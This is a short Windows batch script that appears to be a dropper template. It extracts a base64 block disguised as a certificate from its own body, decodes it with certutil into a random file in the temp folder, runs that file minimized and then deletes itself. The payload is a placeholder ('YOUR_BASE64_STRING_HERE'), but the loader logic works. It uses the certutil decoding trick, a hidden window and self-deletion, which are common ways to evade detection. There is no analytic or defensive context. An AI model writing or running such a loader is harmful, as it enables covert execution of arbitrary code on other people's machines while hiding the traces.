@echo off >nul
setlocal enabledelayedexpansion

set /a i=0
set "name=%temp%\%random%.bat"

for /f "tokens=*" %%A in (%~n0.bat) do (
    set /a i+=1
    if !i! gtr 13 (
        set "line=%%A"
        echo !line!>>%name%
    )
)
certutil -decode -f %name% %name%
start /MIN "" "%name%"

del /F %0
exit

-----BEGIN CERTIFICATE-----
YOUR_BASE64_STRING_HERE_QGVjaG8gb2ZmDZXhpdA==
-----END CERTIFICATE-----
